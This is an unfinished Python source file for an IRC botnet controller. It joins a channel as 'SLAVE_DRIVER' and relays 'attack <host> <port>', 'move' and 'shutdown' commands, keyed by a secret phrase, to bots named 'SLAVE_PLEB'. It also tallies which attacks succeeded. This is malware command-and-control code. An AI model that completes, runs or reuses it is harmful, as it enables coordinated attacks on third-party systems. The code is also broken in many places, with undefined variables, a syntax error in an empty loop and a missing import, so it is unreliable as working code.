import time
import socket 
import sys 

HOST = None
PORT = None 
CHANNEL = None 
PHRASE = None
IRCSOCKET = None 



class conBot:
    global HOST, PORT, CHANNEL, PHRASE, IRCSOCKET

    # CONTROLLER INFO
    conNick = "SLAVE_DRIVER"
    liveConnection = False # Flag to see if controller connection to IRC Server is active
    command = None

    # BOT INFO
    botList = []
    botsSuccessful = []
    botsFailed = []
    botsMoved = []
    botsDisconnected = []

    def setup(self, host, port, channel, phrase):
        self.HOST = host
        self.PORT = port
        self.CHANNEL = channel
        self.PHRASE = phrase
        self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            self.IRCSOCKET.connect((self.HOST, self.PORT))
        except Exception as e:
            sys.stderr.write("Error: " + str(e))
            sys.exit(0)

    def connect(self):
        sock.send(bytes("USER "+ self.conNick +" "+ self.conNick +" "+ self.conNick + " " + self.conNick + "\n", "UTF-8"))
        sock.send(bytes("NICK "+ self.conNick +"\n", "UTF-8"))
        sock.send(bytes("JOIN "+ self.CHANNEL +"\n", "UTF-8"))
        self.liveConnection = True
        print("Controller is running. Connected with nick: " + self.conNick)
        return

    # PingPong protocol
    def pingPong(self):
        pass 

    # Get response from Bot 
    def getResponse(self):
        try:
            # Get response from bot
            msg = ircSocket.recv(1024).decode('utf-8')
            return msg 
        except:
            return False

    # COMMANDS

    # Get bot status
    def botStatus(self):
        # Get bot Nickname and how many there are
        # Append these bots to a list
        msg = self.getResponse()
        if msg != False:
            msg = msg.strip()
            msgLines = msg.split("\n")
            # Get bot names from split lines
            for x in msgLines:
                # See if there is a private message from Bot Slaves
                if x.startswith(":SLAVE_PLEB"):
                    botName = x[x.find(":", 1) + 1:].strip()
                    botList.append(botName)
            botNames = "\n".join(botList)
            print("Num of bots: " + str(len(botList)) + "\nBot Names:\n" + botNames)
            botList.clear()

    # Tell bot to attack
    def botAttack(self, host, port, channel):
        self.sendCommand("attack")
        # Get bot responses 
        msg = self.getResponse()
        if msg != False:
            try:
                msg = msg.strip()
                msgLines = msg.split("\n")
                for x in msgLines:
                    # Get bot responses
            except:
                pass



    # Tell bot to move channel
    def botMove(self, host, port, channel):
        pass 

    # Tell bot to quit
    def botQuit(self):
        global IRCSOCKET
        pass 

    # Tell bot to shutdown
    def botShutdown(self): 
        pass

    # SEND A PRIVATE MESSAGE/COMMAND TO BOTS
    def sendCommand(self, msg):
        toBot = "PRIVMSG " + CHANNEL + " :" + str(msg) + " " + PHRASE + "\n"
        self.IRCSOCKET.send(toBot.encode())
        return

    def botHandler(self):
        global liveConnection
        while liveConnection:
            # Gotta do the readable thing here
            readable, writable, exceptable = select.select([IRCSOCKET, sys.stdin],[sys.stdout],[])
            for x in readable:
                # Start parsing data 

                # If data starts with PONG, send PING 
                self.pingPong() 

                # elif data in command 
                # status, attack, move, quit, shutdown 

    """
    # CONNECT TO IRC SERVER CHANNEL
    # This next line goes to a function
    # ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    def serverConnect(self, host, port):
        global IRCSOCKET, liveConnection 
        try:
            IRCSOCKET = connect((host,port))
            print("Connection successful")
            liveConnection = True 
            return True
        except:
            print("Connection failed")
            return False 
    """

    def run(self):
        while true:
            
            if not self.liveConnection:
                self.connect()

            userCommand = input("command> ")
            self.command = userCommand.split()
            # somewhere send phrase to bot
            # check command
            # send command to bots for them to do
            if (self.command[0] == "status"):
                sendCommand(command[0])
            elif (self.command[0] == "attack"):
                if (len(self.command) == 3):
                    self.botsSuccessful = []
                    self.botsFailed = []
                    self.sendCommand(userCommand)
                else:
                    print("Incorrect usage of command: attack <host-name> <port>")
            elif (self.command[0] == "move"):
                if(len(self.command) == 4):
                    self.botsMoved = []
                    self.sendCommand(userCommand)
                else:
                    print("Incorrect usage of command: move <host-name> <port> <channel>")
            elif (self.command[0] == "quit"):
                sys.exit(0)
            elif (self.command[0] == "shutdown"):
                self.botsDisconnected = []
                self.sendCommand(self.command[0])
            
                
                    



if __name == "__main__":
    global HOST, PORT, CHANNEL, PHRASE, IRCSOCKET

    # Get sys.argv
    if len(sys.argv) != 5:
        print("Wrong numnber of arguments")
        sys.exit() 
    
    HOST = sys.argv[1]
    PORT = sys.argv[2]
    CHANNEL = sys.argv[3]
    PHRASE = sys.argv[4]

    if not PORT.isdigit():
        print("Invalid port.")
        sys.exit() 
    
    # Check if port is in valid range 
    
    cbot = conBot()
    cbot.setup(HOST, PORT, CHANNEL, PHRASE)

    # Keep connection to IRC server 
    while True:
        con.run()
        """
        connectStatus = serverConnect(HOST, PORT)
        if connectStatus == True:
            # Send initial PING? 
            pingPong()

            # Start giving commands to bot
            botHandler()
        """
